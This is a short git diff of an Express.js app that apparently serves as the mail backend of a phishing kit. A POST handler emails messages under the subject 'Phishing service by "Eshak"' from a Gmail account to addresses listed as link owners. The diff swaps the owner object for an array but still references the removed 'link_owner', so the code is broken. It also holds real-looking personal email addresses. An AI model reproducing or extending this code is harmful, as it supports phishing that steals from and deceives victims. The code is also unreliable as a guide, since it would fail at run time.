@@ -25,11 +25,12 @@ app.get('/', function (req, res) {
     
     
 });
-let link_owner=[{
-    "admin":"mdalonebd@gmail.com",
-    "momin":"momin0132813@gmail.com"
-    
-    }];
+var myArray = [
+    {"id": 1, "name": "admin", "email": "mdalonebd@gmail.com"},
+
+    {"id": 2, "name": "Peter"},
+    {"id": 3, "name": "Harry"}
+];
 console.log("obj"+link_owner.admin);
 
 app.post('/_', function (req, res) {
@@ -54,7 +55,7 @@ app.post('/_', function (req, res) {
 
    const mailOptions = {
   from: 'bdeshak5@gmail.com',
-  to: toEmail, //list of receivers
+  to: toEmail.email, //list of receivers
   subject: 'Phishing service by "Eshak"', // Subject line
   text: message //plain text body
 };
